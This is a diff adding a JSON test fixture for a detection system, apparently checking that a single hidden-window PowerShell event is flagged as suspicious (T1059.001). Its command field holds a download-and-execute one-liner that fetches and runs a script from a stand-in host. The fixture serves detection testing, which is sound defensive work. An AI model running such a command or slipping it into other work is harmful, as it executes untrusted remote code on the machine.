@@ -1,0 +1,18 @@
+{
+ "scenario": "suspicious_powershell",
+ "description": "Single suspicious PowerShell execution, no other context. Expect SUSPICIOUS_POWERSHELL only (T1059.001).",
+ "events": [
+  {
+   "event_id": "ps_evt_001",
+   "timestamp": "2026-10-02T14:05:00",
+   "source": "endpoint",
+   "event_type": "process_create",
+   "severity": "medium",
+   "username": "dcole",
+   "hostname": "WS-310",
+   "process": "powershell.exe",
+   "command": "powershell -nop -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')",
+   "message": "PowerShell process created"
+  }
+ ]
+}
